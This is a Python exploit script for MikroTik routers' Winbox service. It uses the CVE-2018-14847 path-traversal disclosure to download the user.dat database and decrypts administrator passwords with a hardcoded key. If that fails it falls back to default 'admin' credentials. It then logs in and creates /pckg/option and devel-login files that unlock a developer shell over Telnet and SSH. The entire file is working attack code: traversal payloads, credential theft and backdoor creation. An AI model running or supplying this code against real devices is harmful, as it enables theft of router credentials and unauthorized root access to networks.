#!/usr/bin/env python
# -*- coding: utf-8 -*-
#

import argparse
import struct
import hashlib

from WinboxMessage import WinboxMessage
from WinboxSession import WinboxSession
import Config

parser = argparse.ArgumentParser(prog='test.py', description='Mikrotik Winbox Exploit')
parser.add_argument('--ip', default=Config.DEFAULT_IP, help='IP address', type=str, dest='ip')
parser.add_argument('--port', default=Config.DEFAULT_PORT, help='Port number', type=int, dest='port')


def get_user_dat(ip, port):
    """
    This function uses the file disclosure vulnerability, CVE-2018-14847, to
    download the user database from /flash/rw/store/user.dat

    :param ip: the address of the router to connect to
    :param port: the winbox port to connect to
    :return: a string containing the user.dat data or an empty string on error
    """

    print("[+] Attempting to connect to {}:{}".format(ip, port))
    session = WinboxSession(ip, port)
    if not session.connect():
        print("[!] Failed to connect to the remote host.")
        return ""

    # open user.dat file
    print("[+] Extracting user.dat...")
    msg = WinboxMessage()
    msg.set_to(2, 2)
    msg.set_command(7)
    msg.set_request_id(1)
    msg.set_reply_expected(True)
    msg.add_string(1, "//./.././.././../flash/rw/store/user.dat")
    session.send(msg)

    msg = session.receive()
    if not msg:
        print("[!] Error receiving an open file response.")
        return ""

    session_id = msg.get_session_id()
    file_size = msg.get_u32(2)

    if file_size == 0:
        print("[!] File size is 0.")
        return ""

    # read the user.dat file
    msg.reset()
    msg.set_to(2, 2)
    msg.set_command(4)
    msg.set_request_id(2)
    msg.set_reply_expected(True)
    msg.set_session_id(session_id)
    msg.add_u32(2, file_size)
    session.send(msg)

    msg = session.receive()
    if not msg:
        print("[!] Error receiving a file content response.")
        return ""

    return msg.get_raw(0x03)


def get_password(user_dat):
    """
    Looks through the user.dat file for an enabled administrative account that
    we can use. Once a useful account is found the password is decrypted.

    :param user_dat: the contents of the users.dat file
    :return: (success, username, password)
    """

    print("[+] Searching for administrator credentials ")

    # the dat file is a series of nv::messages preceded by a two byte length
    data = user_dat

    if len(data) > 4:
        length = struct.unpack("H", data[:2])
        length = length[0]
        data = data[2:]  # skip length

        if data[:2] != b'M2':
            # this is mild insanity but the .dat file messages don't line
            # up properly if a new user is added or whatever.
            data = data[1:]  # skip the new line

        data = data[2:]  # skip M2
        length -= 4  # length + M2

        if Config.DEBUG:
            for i, d in enumerate(data):
                if i % 4 == 0:
                    print('', end=' ')
                if i % 32 == 0:
                    print()
                print("{:02X}".format(d), end=' ')

            print()

        if length > len(data):
            return False, None, None

        # parse the file contents
        msg = WinboxMessage()
        msg.parse_binary(data)

        password = ''
        # we need an active admin account
        # 0x2 has three groups: 1 (read), 2 (write), 3 (full)
        if msg.get_u32(2) == 3:  # and (not msg.get_bool(0xfe000a)):
            username = msg.get_string(1)
            encrypted_pass = msg.get_string(0x11)

            if len(encrypted_pass) == 0:  # or msg.get_u32(0x1f) == 0:
                return False, username, password

            hash_this = username + "283i4jfkai3389"
            md5_hash = hashlib.md5(hash_this.encode()).digest()

            for i, enc_char in enumerate(encrypted_pass):
                dec_char = enc_char ^ md5_hash[i % len(md5_hash)]
                if dec_char == 0:
                    # end of the string! we did it.
                    return True, username, password

                password += chr(dec_char)

            # not everything is null terminated. Kind of annoying. Let's
            # loop over the result and see if everything is ascii. If
            # so we can roll with that.
            good = True

            for c in password:
                if ord(c) < 0x20 or ord(c) > 0x7f:
                    good = False

            if good:
                return True, username, password

        return False, None, None


def create_file(ip, port, username, password):
    """
    This function creates the file /pckg/option on the target. This will enable
    the developer login on Telnet and SSH. Oddly, you'll first need to log in
    to Telnet for SSH to work, but I digress...

    :param ip: the ip address of the router
    :param port: the port of the jsproxy we'll connect to
    :param username: the username we'll authenticate with
    :param password: the password we'll authenticate with
    :return: True if we successfully created the file.
    """
    session = WinboxSession(ip, port)
    if not session.connect():
        print("[!] Failed to connect to the remote host.")
        return False

    session_id = 0
    if not session.login(username, password, session_id):
        print("[-] Login failed.")
        return False

    print("[+] Creating /pckg/option on {}:{}".format(ip, port))

    msg = WinboxMessage()
    msg.set_to(2, 2)
    msg.set_command(1)
    msg.set_request_id(1)
    msg.set_reply_expected(True)
    msg.set_session_id(session_id)
    msg.add_string(1, "//./.././.././../pckg/option")
    session.send(msg)

    msg = session.receive()
    if msg.has_error():
        print("[-]", msg.get_error_string())
        return False

    print("[+] Creating /flash/nova/etc/devel-login on {}:{}".format(ip, port))
    msg.reset()
    msg.set_to(2, 2)
    msg.set_command(1)
    msg.set_request_id(2)
    msg.set_reply_expected(True)
    msg.set_session_id(session_id)
    msg.add_string(1, "//./.././.././../flash/nova/etc/devel-login")
    session.send(msg)

    msg = session.receive()
    if msg.has_error():
        print("[-]", msg.get_error_string())
        return False

    return True


def main():
    args = parser.parse_args()

    # step 1. parse the file
    user_dat = get_user_dat(args.ip, args.port)
    if Config.DEBUG:
        print(user_dat)

    # step 2. decrypt the password
    success, username, password = get_password(user_dat)
    if not success:
        print("[-] Failed to find admin creds. Trying default.")
        username = "admin"
        password = ""

    print("[+] Using credentials - {}:{}".format(username, password))

    # step 3. create the file
    if not create_file(args.ip, args.port, username, password):
        return 1

    print("[+] There's a light on")
    return 0


if __name__ == '__main__':
    main()
